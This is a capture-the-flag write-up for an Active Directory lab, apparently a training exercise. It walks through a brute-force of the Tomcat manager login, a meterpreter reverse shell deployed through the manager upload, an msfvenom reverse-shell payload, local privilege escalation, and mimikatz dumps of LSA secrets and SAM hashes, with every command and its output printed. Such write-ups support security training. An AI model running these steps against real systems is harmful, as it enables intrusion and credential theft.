![](/images/ctf-round-3-active-directory/1.png)

This is a writeup for CTF Round 3 - Active Directory. In this CTF, there are 4 challenges which are VPN, web server, file server and Domain Controller. Some of the challenges are hard and need to go for experimenting and reading through previous writeup and might find some ideas from there.  

> Note that some of the informations are confidential, therefore I changed a little bit.  

## Challenges - VPN

Each of the participant given own unique vpn config file. Answer for this challenge is based on the vpn config file.

### Q1 - VPN configuration

![](/images/ctf-round-3-active-directory/2.png)

Question 1 asking for information about VPN server public ip. Hint said this can be found in the VPN config file. So, I open the config file using my favourite code editor.

```
remote vpn.ctf.xxxxxxxxxx.com 11139 udp
```

While scrolling, I found this line of config included host name, port number and protocol. I copied the host name and ran into [WHOIS IP Lookup Tool](https://www.ultratools.com/tools/ipWhoisLookup). Found the IP address 178.XXX.XXX.221.

**Answer: 178.XXX.XXX.221:udp:11139**  

### Q2 - VPN user network address

![](/images/ctf-round-3-active-directory/3.png)

Question 2 asked for the user network address. To achieve that, I need to connect to the VPN. I ran `sudo openvpn vpn_conect.config`. Once connection initialized, I ran `ifconfig` and look for interface name like **tunXX**. There is the user IP address at the interface. Note that network address is like **10.XXX.XXX.0**. Simply changed it.

**Answer: 10.0.200.0**

### Q3 - Challenge server network address

![](/images/ctf-round-3-active-directory/4.png)

Question 3 asked for the server network address. Hint said I need to use command `netstat -rn`. I ran the command and get this output.

```
$ netstat -rn

Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
0.0.0.0         192.168.1.1     0.0.0.0         UG        0 0          0 eth0
10.0.200.0      0.0.0.0         255.255.255.0   U         0 0          0 tun0
192.168.1.0     0.0.0.0         255.255.255.0   U         0 0          0 eth0
192.168.9.0     10.0.200.1      255.255.255.0   UG        0 0          0 tun0
192.168.240.0   10.0.200.1      255.255.255.0   UG        0 0          0 tun0
```

On interface **tun0**, there are 2 network address, **192.168.9.0** and **192.168.240.0** that have flag **UG**. This flag means that the route is up and point to a gateway. Both address point to **10.0.200.1** which is the gateway. I tested both network address and got the right answer.

**Answer: 192.168.240.0**

## Challenges - Web Server

To answer this challenge, I need to know the IP address of the web server. I went through the question and found hint on **question 6** which stated the ip address **192.168.240.80**. I ran `nmap -Pn -A 192.168.240.80` and got something.

```
$ nmap -Pn -A 192.168.9.0/24

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-21 23:50 +08
Nmap scan report for 192.168.240.80
Host is up (0.16s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE VERSION
80/tcp   closed http
443/tcp  closed https
8080/tcp open   http    Apache Tomcat 8.5.59
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.59

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.79 seconds
```

**nmap** discovered 3 ports on **192.168.240.80** and only 1 port is open, port **8080** -> Apache Tomcat.

### Q1 - Username and password for webserver 'cat' with name 'tom'.

![](/images/ctf-round-3-active-directory/5.png)

I ran `msfconsole` and search for specific modules about the Apache Tomcat by using command `search tomcat`.

```
msf6 > search tomcat

Matching Modules
================

   #   Name                                                         Disclosure Date  Rank       Check  Description
   -   ----                                                         ---------------  ----       -----  -----------
   0   auxiliary/admin/http/ibm_drm_download                        2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   1   auxiliary/admin/http/tomcat_administration                                    normal     No     Tomcat Administration Tool Default Access
   2   auxiliary/admin/http/tomcat_utf8_traversal                   2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
   3   auxiliary/admin/http/trendmicro_dlp_traversal                2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
   4   auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   5   auxiliary/dos/http/apache_tomcat_transfer_encoding           2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   6   auxiliary/dos/http/hashcollision_dos                         2011-12-28       normal     No     Hashtable Collisions
   7   auxiliary/scanner/http/tomcat_enum                                            normal     No     Apache Tomcat User Enumeration
   8   auxiliary/scanner/http/tomcat_mgr_login                                       normal     No     Tomcat Application Manager Login Utility
   9   exploit/linux/http/cisco_prime_inf_rce                       2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   10  exploit/linux/http/cpi_tararchive_upload                     2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
   11  exploit/multi/http/cisco_dcnm_upload_2019                    2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   12  exploit/multi/http/struts2_namespace_ognl                    2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   13  exploit/multi/http/struts_code_exec_classloader              2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   14  exploit/multi/http/struts_dev_mode                           2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   15  exploit/multi/http/tomcat_jsp_upload_bypass                  2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   16  exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   17  exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   18  exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   19  exploit/windows/http/cayin_xpost_sql_rce                     2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
   20  exploit/windows/http/tomcat_cgi_cmdlineargs                  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   21  post/multi/gather/tomcat_gather                                               normal     No     Gather Tomcat Credentials
   22  post/windows/gather/enum_tomcat                                               normal     No     Windows Gather Apache Tomcat Enumeration
```

I use module 8 to attempt our login to the Tomcat Application Manager. Simply select the module using command `use 8` and configured it properly. After that, I ran the module using command `exploit`.

```
msf6 > use 8
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOST 192.168.240.80
RHOST => 192.168.240.80
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[-] 192.168.240.80:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: admin:root (Incorrect)
[+] 192.168.240.80:8080 - Login Successful: admin:tomcat
[-] 192.168.240.80:8080 - LOGIN FAILED: manager:admin (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: manager:manager (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: manager:root (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: role1:admin (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: role1:manager (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: role1:root (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: root:admin (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: root:manager (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: root:role1 (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: root:root (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: root:vagrant (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:root (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:s3cret (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:vagrant (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: both:admin (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: both:manager (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: both:role1 (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: both:root (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: both:tomcat (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: both:s3cret (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: both:vagrant (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: j2deployer:j2deployer (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: cxsdk:kdsxc (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: root:owaspbwa (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: ADMIN:ADMIN (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: xampp:xampp (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:s3cret (Incorrect)
[-] 192.168.240.80:8080 - LOGIN FAILED: QCC:QLogic66 (Incorrect)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Got the valid credential for tomcat (**admin:tomcat**). I login the Tomcat Manager site with the credential and I'm inside!

![](/images/ctf-round-3-active-directory/13.png)

**Answer: admin:tomcat**

### Q2 - MD5 checksum hash for file 'tomcat.ico'

![](/images/ctf-round-3-active-directory/6.png)

Next, I need to gain access to the remote target through the Apache Tomcat service. To do that, I ran `use 17` to select module `multi/http/tomcat_mgr_upload` and configured it properly. Then I ran the exploit.

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > use 17
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword tomcat
HttpPassword => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername admin
HttpUsername => admin
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 192.168.240.80
RHOSTS => 192.168.240.80
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080
RPORT => 8080
msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.0.200.2
LHOST => 10.0.200.2
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 10.0.200.2:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying obllDiY...
[*] Executing obllDiY...
[*] Sending stage (58125 bytes) to 192.168.240.80
[*] Meterpreter session 1 opened (10.0.200.2:4444 -> 192.168.240.80:57086) at 2020-11-22 00:45:10 +0800
[*] Undeploying obllDiY ...

meterpreter > 
```

The exploit working and now I have a Meterpreter shell on the remote target. I ran `sysinfo` to get information about the remote system and `getuid` to get the user that the server is running as.

```
meterpreter > sysinfo
Computer    : prod-websrv7765
OS          : Windows Server 2012 R2 6.3 (amd64)
Meterpreter : java/windows

meterpreter > getuid
Server username: LOCAL SERVICE
```

Right now, I'm as `LOCAL SERVICE`. Next, I ran `ls` to list out the folders and files.

```
meterpreter > ls
Listing: C:\Program Files\Apache Software Foundation\Tomcat 8.5
===============================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100776/rwxrwxrw-  58068  fil   2020-10-07 00:58:40 +0800  LICENSE
100776/rwxrwxrw-  1777   fil   2020-10-07 00:58:40 +0800  NOTICE
100776/rwxrwxrw-  7314   fil   2020-10-07 00:58:40 +0800  RELEASE-NOTES
100776/rwxrwxrw-  81704  fil   2020-10-07 00:59:30 +0800  Uninstall.exe
40776/rwxrwxrw-   4096   dir   2020-11-03 08:58:32 +0800  bin
40776/rwxrwxrw-   4096   dir   2020-11-03 09:21:48 +0800  conf
40776/rwxrwxrw-   12288  dir   2020-11-03 08:58:32 +0800  lib
40776/rwxrwxrw-   16384  dir   2020-11-22 00:29:46 +0800  logs
40776/rwxrwxrw-   4096   dir   2020-11-22 00:45:18 +0800  temp
100776/rwxrwxrw-  21630  fil   2020-10-07 00:58:50 +0800  tomcat.ico
40776/rwxrwxrw-   16384  dir   2020-11-22 00:45:15 +0800  webapps
40776/rwxrwxrw-   0      dir   2020-11-18 13:55:43 +0800  work
```

This question ask for MD5 hash for `tomcat.ico`. To do that, I ran `checksum md5 tomcat.ico`.

```
meterpreter > checksum md5 tomcat.ico
4644f2d45601037b8423d45e13194c93  tomcat.ico
```

**Answer: 4644f2d45601037b8423d45e13194c93**

### Q3 - Plain text password for domain user

![](/images/ctf-round-3-active-directory/7.png)

Next, I need to create a windows meterpreter using `msfvenom`. Simply ran `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.200.2 LPORT=5555 -f exe > meterpreter.exe`.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.200.2 LPORT=5555 -f exe > meterpreter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes

$ file meterpreter.exe 
meterpreter.exe: PE32+ executable (GUI) x86-64, for MS Windows
```

Now I have a Windows executable ready to go. Next, I used `exploit/multi/handler` to handle the exploit launched outside of the framework. I configured the handler exactly same as the configuration I used to create the Windows binary Meterpreter. Then I ran `exploit`.

```
$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.200.2
LHOST => 10.0.200.2
msf6 exploit(multi/handler) > set LPORT 5555
LPORT => 5555
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.0.200.2:5555
```

After that, I went back to other Meterpreter. I uploaded the Windows binary, spawned a shell and ran the binary.

```
meterpreter > upload meterpreter.exe
[*] uploading  : meterpreter.exe -> meterpreter.exe
[*] Uploaded -1.00 B of 7.00 KiB (-0.01%): meterpreter.exe -> meterpreter.exe
[*] uploaded   : meterpreter.exe -> meterpreter.exe
meterpreter > shell
Process 4 created.
Channel 5 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files\Apache Software Foundation\Tomcat 8.5>meterpreter.exe
meterpreter.exe
```

Now I have Windows Meterpreter running.

```
[*] Sending stage (200262 bytes) to 192.168.240.80
[*] Meterpreter session 1 opened (10.0.200.2:5555 -> 192.168.240.80:57639) at 2020-11-22 01:47:30 +0800

meterpreter >
```

Right now, I'm `NT AUTHORITY\LOCAL SERVICE` and I need to get `NT AUTHORITY\SYSTEM`. To achieve that, here's come privilege escalation.  

I do some digging and found module `post/multi/recon/local_exploit_suggester`. This module suggested local meterpreter exploits that can be used. I ran `background` and `use post/multi/recon/local_exploit_suggester`. I configured it with session 1 and ran the module.

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 192.168.240.80 - Collecting local exploits for x64/windows...
[*] 192.168.240.80 - 20 exploit checks are being tried...
[+] 192.168.240.80 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 192.168.240.80 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 192.168.240.80 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 192.168.240.80 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 192.168.240.80 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[*] Post module execution completed
```

I give a try to `exploit/windows/local/bypassuac_dotnet_profiler`.

```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/bypassuac_dotnet_profiler
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_dotnet_profiler) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/bypassuac_dotnet_profiler) > set LHOST 10.0.200.2
LHOST => 10.0.200.2
msf6 exploit(windows/local/bypassuac_dotnet_profiler) > set LPORT 6666
LPORT => 6666
msf6 exploit(windows/local/bypassuac_dotnet_profiler) > run

[*] Started reverse TCP handler on 10.0.200.2:6666 
[*] UAC is Enabled, checking level...
[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
[*] Exploit completed, but no session was created.
```

Hurm no luck. Moving on to `exploit/windows/local/bypassuac_sdclt`.

```
msf6 exploit(windows/local/bypassuac_dotnet_profiler) > use exploit/windows/local/bypassuac_sdclt
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 10.0.200.2
LHOST => 10.0.200.2
msf6 exploit(windows/local/bypassuac_sdclt) > set LPORT 6666
LPORT => 6666
msf6 exploit(windows/local/bypassuac_sdclt) > run

[*] Started reverse TCP handler on 10.0.200.2:6666 
[*] UAC is Enabled, checking level...
[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
[*] Exploit completed, but no session was created.
```

No luck again. I skipped the other 2 and use `exploit/windows/local/ms16_075_reflection_juicy` because it said juicy?

```
msf6 exploit(windows/local/bypassuac_sdclt) > use exploit/windows/local/ms16_075_reflection_juicy
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set LHOST 10.0.200.2
LHOST => 10.0.200.2
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set LPORT 6666
LPORT => 6666
msf6 exploit(windows/local/ms16_075_reflection_juicy) > run

[*] Started reverse TCP handler on 10.0.200.2:6666 
[+] Target appears to be vulnerable (Windows 2012 R2 (6.3 Build 9600).)
[*] Launching notepad to host the exploit...
[+] Process 3056 launched.
[*] Reflectively injecting the exploit DLL into 3056...
[*] Injecting exploit into 3056...
[*] Exploit injected. Injecting exploit configuration into 3056...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 192.168.240.80
[*] Meterpreter session 2 opened (10.0.200.2:6666 -> 192.168.240.80:57925) at 2020-11-22 02:19:16 +0800

meterpreter >
```

I'm in as `NT AUTHORITY\SYSTEM`.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

To answer the question, I ran `use kiwi` to load kiwi module and `lsa_dump_secrets` to dump LSA secrets. `Kiwi` module used to perform various types of credential-oriented operations such as dumping passwords and hashes, dumping passwords in memory, generating golden tickets, and more.

```
meterpreter > use kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.
meterpreter > lsa_dump_secrets
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : PROD-WEBSRV7765
SysKey : 14a513800f23074d06b371d5b4bfdb86

Local name : PROD-WEBSRV7765 ( S-1-5-21-1669853405-1314316162-1621276032 )
Domain name : MYCOMS ( S-1-5-21-2804598327-1020562986-2106375421 )
Domain FQDN : mycoms.com.local

Policy subsystem is : 1.12
LSA Key(s) : 1, default {623d7843-d8a7-c5a9-01fa-119217f4064e}
  [00] {623d7843-d8a7-c5a9-01fa-119217f4064e} b45240c17c8897e3d5270783f4cc737f278b68d474c51a505bc077bf2220b1df

Secret  : $MACHINE.ACC
cur/text: WI6$*\T[fZ%F!qqD%?^U]E"jn &Cne6fI2qCJp wz9<@K!wVZi;^3vnV>b(9g3l2#o@q%bEko62%n2`ogG2rwc6/@XNumW__4/b;j8j/k0o++/n ._/s9`^'
    NTLM:eddb95449e4807dedc0d2ecdbe361719
    SHA1:2e0566e564a5cb48646c1d3560022113efdc4df5
old/text: WI6$*\T[fZ%F!qqD%?^U]E"jn &Cne6fI2qCJp wz9<@K!wVZi;^3vnV>b(9g3l2#o@q%bEko62%n2`ogG2rwc6/@XNumW__4/b;j8j/k0o++/n ._/s9`^'
    NTLM:eddb95449e4807dedc0d2ecdbe361719
    SHA1:2e0566e564a5cb48646c1d3560022113efdc4df5

Secret  : DefaultPassword

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 d9 d2 0c 8c f2 c0 fe 37 7e 8a 5b f6 a9 38 49 99 8b a6 93 20 b2 9e c0 9d c6 41 5a a6 cc df 31 fd 9b ce 53 ba 1e 8c 31 71 
    full: d9d20c8cf2c0fe377e8a5bf6a93849998ba69320b29ec09dc6415aa6ccdf31fd9bce53ba1e8c3171
    m/u : d9d20c8cf2c0fe377e8a5bf6a93849998ba69320 / b29ec09dc6415aa6ccdf31fd9bce53ba1e8c3171
old/hex : 01 00 00 00 55 0b 07 be cc e6 4f 90 bb 45 62 4a 4a dc 7f 91 50 a8 90 cc dd dc d2 a3 ce 33 5a 29 49 3d 60 6f 25 a5 03 2e 42 39 b1 96 
    full: 550b07becce64f90bb45624a4adc7f9150a890ccdddcd2a3ce335a29493d606f25a5032e4239b196
    m/u : 550b07becce64f90bb45624a4adc7f9150a890cc / dddcd2a3ce335a29493d606f25a5032e4239b196

Secret  : NL$KM
cur/hex : 29 5b d7 f4 51 cb 5a 3f e2 9e bb cd 4f 8a 7c 36 d3 31 1e 24 9c 7e a4 da c6 b0 57 78 3e 4b e6 f3 b2 2d fd d8 83 b6 9e 9e f8 fc 13 d3 77 37 e4 7f 8b 6a 7c ad 41 2c 86 06 1c 0d ef 4d 0a c2 e1 59 

Secret  : _SC_SplunkForwarder / service 'SplunkForwarder' with username : mycoms\ali
cur/text: P@ssw0rd123!
```

The password for domain user is stated there.

**Answer: P@ssw0rd123!** 

### Q4 - NTLM hash result for user Administrator

![](/images/ctf-round-3-active-directory/8.png)

For this question, I use `post/windows/gather/smart_hashdump` to dump local accounts from the SAM Database.

```
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/local/ms16_075_reflection_juicy) > use post/windows/gather/smart_hashdump
msf6 post(windows/gather/smart_hashdump) > set SESSION 2
SESSION => 2
msf6 post(windows/gather/smart_hashdump) > run

[*] Running module against PROD-WEBSRV7765
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /home/ahmad/.msf4/loot/20201122030536_default_192.168.240.80_windows.hashes_705427.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*] 	Obtaining the boot key...
[*] 	Calculating the hboot key using SYSKEY 14a513800f23074d06b371d5b4bfdb86...
[*] 	Obtaining the user list and keys...
[*] 	Decrypting user keys...
[*] 	Dumping password hints...
[*] 	No users with password hints on this system
[*] 	Dumping password hashes...
[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
[*] Post module execution completed
```

Now I have the full NTLM hash for Administrator.

**Answer: Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::**

### Q5 - Plain text password for user Administrator

![](/images/ctf-round-3-active-directory/9.png)

The full NTLM hash consist of 4 parts which are `username` : `relative identifier` : `LM hash` : `NT hash` :::. To get the password for user Administrator, I need to crack the `NT hash` using `john` or [crackstation.net](https://crackstation.net/). I copied the `NT hash` and paste it on online tool.

![](/images/ctf-round-3-active-directory/14.png)

**Answer: P@ssw0rd**

### Q6 - Domain User

![](/images/ctf-round-3-active-directory/10.png)

Based on the output of `lsa_dump_secrets`, the domain user is ali

**Answer: ali**

### Q7 - Domain Admin

![](/images/ctf-round-3-active-directory/11.png)

I uploaded `winPEAS.exe` and executed it. Here's the output of `winPEAE.exe` on `Users Information`.

```
===========================================(Users Information)===========================================

  [+] Users
   [?] Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
  Current user: SYSTEM
  Current groups: Administrators, Everyone, Authenticated Users
   =================================================================================================

    PROD-WEBSRV7765\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-Expi-Req

    PROD-WEBSRV7765\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq

    MYCOMS\Administrator: Built-in account for administering the computer/domain
        |->Groups: Domain Users,Administrators,Schema Admins,Enterprise Admins,Domain Admins,Group Policy Creator Owners
        |->Password: CanChange-Expi-Req

    MYCOMS\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Domain Guests,Guests
        |->Password: NotChange-NotExpi-NotReq

    MYCOMS\krbtgt(Disabled): Key Distribution Center Service Account
        |->Groups: Domain Users,Denied RODC Password Replication Group
        |->Password: CanChange-Expi-Req

    MYCOMS\abu
        |->Groups: Domain Users,Enterprise Admins,Domain Admins
        |->Password: CanChange-NotExpi-Req

    MYCOMS\ali
        |->Groups: Domain Users,Performance Log Users,Event Log Readers
        |->Password: NotChange-NotExpi-Req

    MYCOMS\umar
        |->Groups: Domain Users,Domain Admins
        |->Password: CanChange-NotExpi-Req
```

Note that there were 2 domain admins who are `abu` and `umar`.

**Answer: abu:umar**

### Q8 - Enterprise Admins

![](/images/ctf-round-3-active-directory/12.png)

Based on the output of `winPEAS.exe` on `Users Information`, there is only enterprise admin who is `abu`.

**Answer: abu**

## Challenges - File Server

### Q1 - IP address of file server

![](/images/ctf-round-3-active-directory/15.png)

On the meterpreter, I ran `arp` to display the host ARP cache.

```
meterpreter > arp

ARP cache
=========

    IP address       MAC address        Interface
    ----------       -----------        ---------
    192.168.240.1    00:0c:29:4c:f2:d9  12
    192.168.240.13   00:50:56:ab:40:8b  12
    192.168.240.30   00:0c:29:3b:05:22  12
    192.168.240.255  ff:ff:ff:ff:ff:ff  12
    224.0.0.22       00:00:00:00:00:00  1
    224.0.0.22       01:00:5e:00:00:16  12
    224.0.0.252      01:00:5e:00:00:fc  12
```

I tried to nmap each of the address. The 1st address gives nothing. Then move on to the next one, it has hostname included `fsrv`. 

```
$ nmap -Pn -A 192.168.240.13
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-22 03:41 +08
Nmap scan report for 192.168.240.13
Host is up (0.055s latency).
Not shown: 995 filtered ports
PORT     STATE  SERVICE            VERSION
111/tcp  closed rpcbind
135/tcp  open   msrpc              Microsoft Windows RPC
139/tcp  open   netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open   ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=prod-fsrv5633.mycoms.com.local
| Not valid before: 2020-11-02T10:27:27
|_Not valid after:  2021-05-04T10:27:27
|_ssl-date: 2020-11-21T19:42:09+00:00; -12s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -12s, deviation: 0s, median: -12s
|_nbstat: NetBIOS name: PROD-FSRV5633, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:40:8b (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-21T19:41:29
|_  start_date: 2020-11-03T10:27:26

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.07 seconds
```

**Answer: 192.168.240.13**

### Q2 - Folder share name that 'domain user' has write access to file server

![](/images/ctf-round-3-active-directory/16.png)

Since I have the credential of the domain user which is user `ali`, I can use `smbmap` to check it. 

```
smbmap -H 192.168.240.13 -d MYCOMS -u ali -p P@ssw0rd123!
[+] IP: 192.168.240.13:445	Name: 192.168.240.13                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Admin File                                        	READ ONLY	
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
